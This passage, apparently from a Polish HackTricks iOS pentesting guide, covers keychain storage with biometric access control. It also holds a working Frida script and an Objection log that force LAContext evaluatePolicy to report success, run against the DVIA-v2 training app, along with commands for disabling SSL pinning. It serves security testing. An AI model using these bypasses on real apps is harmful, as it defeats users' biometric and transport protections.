(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Teraz moÅ¼emy zaÅ¼Ä…daÄ‡ zapisanej pozycji z keychain. UsÅ‚ugi keychain wyÅ›wietlÄ… uÅ¼ytkownikowi okno dialogowe uwierzytelniania i zwrÃ³cÄ… dane lub nil w zaleÅ¼noÅ›ci od tego, czy podano odpowiedni odcisk palca, czy nie.

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Wykrywanie

UÅ¼ycie frameworkÃ³w w aplikacji moÅ¼na rÃ³wnieÅ¼ wykryÄ‡, analizujÄ…c listÄ™ wspÃ³Å‚dzielonych bibliotek dynamicznych w binarnej wersji aplikacji. MoÅ¼na to zrobiÄ‡ za pomocÄ… `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
JeÅ›li `LocalAuthentication.framework` jest uÅ¼ywany w aplikacji, wynik bÄ™dzie zawieraÅ‚ obie poniÅ¼sze linie (pamiÄ™taj, Å¼e `LocalAuthentication.framework` uÅ¼ywa `Security.framework` w tle):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
JeÅ›li uÅ¼ywany jest `Security.framework`, tylko drugi zostanie wyÅ›wietlony.

### OminiÄ™cie Ramy Lokalnej Autoryzacji

#### **Objection**

DziÄ™ki **Objection Biometrics Bypass**, znajdujÄ…cemu siÄ™ na [tej stronie GitHub](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), dostÄ™pna jest technika umoÅ¼liwiajÄ…ca pokonanie mechanizmu **LocalAuthentication**. IstotÄ… tego podejÅ›cia jest wykorzystanie **Frida** do manipulacji funkcjÄ… `evaluatePolicy`, zapewniajÄ…c, Å¼e zawsze zwraca wynik `True`, niezaleÅ¼nie od rzeczywistego sukcesu autoryzacji. Jest to szczegÃ³lnie przydatne do omijania wadliwych procesÃ³w autoryzacji biometrycznej.

Aby aktywowaÄ‡ to ominiÄ™cie, uÅ¼ywa siÄ™ nastÄ™pujÄ…cego polecenia:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
To polecenie uruchamia sekwencjÄ™, w ktÃ³rej Objection rejestruje zadanie, ktÃ³re skutecznie zmienia wynik sprawdzenia **`evaluatePolicy`** na `True`.

#### Frida

PrzykÅ‚ad uÅ¼ycia **`evaluatePolicy`** z aplikacji [DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Aby osiÄ…gnÄ…Ä‡ **bypass** lokalnej autoryzacji, napisano skrypt Frida. Skrypt ten celuje w kontrolÄ™ **evaluatePolicy**, przechwytujÄ…c jej callback, aby upewniÄ‡ siÄ™, Å¼e zwraca **success=1**. Poprzez zmianÄ™ zachowania callbacka, kontrola autoryzacji jest skutecznie omijana.

PoniÅ¼szy skrypt jest wstrzykiwany, aby zmodyfikowaÄ‡ wynik metody **evaluatePolicy**. Zmienia wynik callbacka, aby zawsze wskazywaÅ‚ na sukces.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Aby wstrzyknÄ…Ä‡ skrypt Frida i obejÅ›Ä‡ uwierzytelnianie biometryczne, uÅ¼ywa siÄ™ nastÄ™pujÄ…cego polecenia:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Ekspozycja WraÅ¼liwej FunkcjonalnoÅ›ci przez IPC

### Niestandardowe ObsÅ‚ugiwacze URI / Deeplinks / Niestandardowe Schematy

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Uniwersalne Linki

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UdostÄ™pnianie UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Rozszerzenia Aplikacji

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serializacja i Kodowanie

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Komunikacja Sieciowa

WaÅ¼ne jest, aby sprawdziÄ‡, czy nie zachodzi Å¼adna komunikacja **bez szyfrowania** oraz czy aplikacja poprawnie **waliduje certyfikat TLS** serwera.\
Aby sprawdziÄ‡ te problemy, moÅ¼esz uÅ¼yÄ‡ proxy, takiego jak **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Sprawdzenie Nazwy Host

Jednym z powszechnych problemÃ³w przy walidacji certyfikatu TLS jest sprawdzenie, czy certyfikat zostaÅ‚ podpisany przez **zaufane** **CA**, ale **nie sprawdzenie**, czy **nazwa hosta** certyfikatu jest nazwÄ… hosta, do ktÃ³rej siÄ™ uzyskuje dostÄ™p.\
Aby sprawdziÄ‡ ten problem za pomocÄ… Burp, po zaufaniu Burp CA na iPhonie, moÅ¼esz **utworzyÄ‡ nowy certyfikat z Burp dla innej nazwy hosta** i go uÅ¼yÄ‡. JeÅ›li aplikacja nadal dziaÅ‚a, to coÅ› jest podatne.

### Pinning Certyfikatu

JeÅ›li aplikacja poprawnie uÅ¼ywa SSL Pinning, to aplikacja bÄ™dzie dziaÅ‚aÄ‡ tylko wtedy, gdy certyfikat jest tym, ktÃ³rego siÄ™ oczekuje. Podczas testowania aplikacji **moÅ¼e to byÄ‡ problem, poniewaÅ¼ Burp bÄ™dzie serwowaÄ‡ swÃ³j wÅ‚asny certyfikat.**\
Aby obejÅ›Ä‡ tÄ™ ochronÄ™ na urzÄ…dzeniu z jailbreakiem, moÅ¼esz zainstalowaÄ‡ aplikacjÄ™ [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) lub zainstalowaÄ‡ [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **objection's** `ios sslpinning disable`

## RÃ³Å¼ne

* W **`/System/Library`** moÅ¼esz znaleÅºÄ‡ frameworki zainstalowane w telefonie uÅ¼ywane przez aplikacje systemowe
* Aplikacje zainstalowane przez uÅ¼ytkownika z App Store znajdujÄ… siÄ™ w **`/User/Applications`**
* A **`/User/Library`** zawiera dane zapisane przez aplikacje na poziomie uÅ¼ytkownika
* MoÅ¼esz uzyskaÄ‡ dostÄ™p do **`/User/Library/Notes/notes.sqlite`**, aby przeczytaÄ‡ notatki zapisane w aplikacji.
* W folderze zainstalowanej aplikacji (**`/User/Applications/<APP ID>/`**) moÅ¼esz znaleÅºÄ‡ kilka interesujÄ…cych plikÃ³w:
* **`iTunesArtwork`**: Ikona uÅ¼ywana przez aplikacjÄ™
* **`iTunesMetadata.plist`**: Informacje o aplikacji uÅ¼ywane w App Store
* **`/Library/*`**: Zawiera preferencje i pamiÄ™Ä‡ podrÄ™cznÄ…. W **`/Library/Cache/Snapshots/*`** moÅ¼esz znaleÅºÄ‡ zrzut wykonany dla aplikacji przed wysÅ‚aniem jej w tle.

### Hot Patching/Wymuszone Aktualizacje

Deweloperzy mogÄ… zdalnie **natychmiast zaÅ‚ataÄ‡ wszystkie instalacje swojej aplikacji** bez koniecznoÅ›ci ponownego przesyÅ‚ania aplikacji do App Store i czekania na jej zatwierdzenie.\
W tym celu zazwyczaj uÅ¼ywa siÄ™ [**JSPatch**](https://github.com/bang590/JSPatch)**.** IstniejÄ… jednak rÃ³wnieÅ¼ inne opcje, takie jak [Siren](https://github.com/ArtSabintsev/Siren) i [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**To niebezpieczny mechanizm, ktÃ³ry moÅ¼e byÄ‡ naduÅ¼ywany przez zÅ‚oÅ›liwe SDK stron trzecich, dlatego zaleca siÄ™ sprawdzenie, ktÃ³ra metoda jest uÅ¼ywana do automatycznych aktualizacji (jeÅ›li w ogÃ³le) i przetestowanie jej.** MoÅ¼esz sprÃ³bowaÄ‡ pobraÄ‡ wczeÅ›niejszÄ… wersjÄ™ aplikacji w tym celu.

### Strony Trzecie

ZnaczÄ…cym wyzwaniem zwiÄ…zanym z **SDK stron trzecich** jest **brak szczegÃ³Å‚owej kontroli** nad ich funkcjonalnoÅ›ciami. Deweloperzy stajÄ… przed wyborem: albo zintegrowaÄ‡ SDK i zaakceptowaÄ‡ wszystkie jego funkcje, w tym potencjalne luki w zabezpieczeniach i obawy dotyczÄ…ce prywatnoÅ›ci, albo caÅ‚kowicie zrezygnowaÄ‡ z jego korzyÅ›ci. CzÄ™sto deweloperzy nie sÄ… w stanie sami zaÅ‚ataÄ‡ luk w tych SDK. Ponadto, gdy SDK zyskujÄ… zaufanie w spoÅ‚ecznoÅ›ci, niektÃ³re mogÄ… zaczÄ…Ä‡ zawieraÄ‡ zÅ‚oÅ›liwe oprogramowanie.

UsÅ‚ugi Å›wiadczone przez SDK stron trzecich mogÄ… obejmowaÄ‡ Å›ledzenie zachowaÅ„ uÅ¼ytkownikÃ³w, wyÅ›wietlanie reklam lub ulepszanie doÅ›wiadczeÅ„ uÅ¼ytkownikÃ³w. Jednak wprowadza to ryzyko, poniewaÅ¼ deweloperzy mogÄ… nie byÄ‡ w peÅ‚ni Å›wiadomi kodu wykonywanego przez te biblioteki, co prowadzi do potencjalnych zagroÅ¼eÅ„ dla prywatnoÅ›ci i bezpieczeÅ„stwa. WaÅ¼ne jest, aby ograniczyÄ‡ informacje udostÄ™pniane usÅ‚ugom stron trzecich do tego, co jest konieczne, i upewniÄ‡ siÄ™, Å¼e Å¼adne wraÅ¼liwe dane nie sÄ… ujawniane.

Implementacja usÅ‚ug stron trzecich zazwyczaj wystÄ™puje w dwÃ³ch formach: jako samodzielna biblioteka lub peÅ‚ne SDK. Aby chroniÄ‡ prywatnoÅ›Ä‡ uÅ¼ytkownikÃ³w, wszelkie dane udostÄ™pniane tym usÅ‚ugom powinny byÄ‡ **anonimizowane**, aby zapobiec ujawnieniu Osobowych Danych Identyfikowalnych (PII).

Aby zidentyfikowaÄ‡ biblioteki uÅ¼ywane przez aplikacjÄ™, moÅ¼na uÅ¼yÄ‡ polecenia **`otool`**. To narzÄ™dzie powinno byÄ‡ uruchamiane w odniesieniu do aplikacji i kaÅ¼dej uÅ¼ywanej przez niÄ… biblioteki wspÃ³Å‚dzielonej, aby odkryÄ‡ dodatkowe biblioteki.
```bash
otool -L <application_path>
```
## **Referencje i dodatkowe zasoby**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS i testowanie aplikacji mobilnych - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Darmowy kurs IOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Wersja Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Wersja Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}
{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
</details>
{% endhint %}
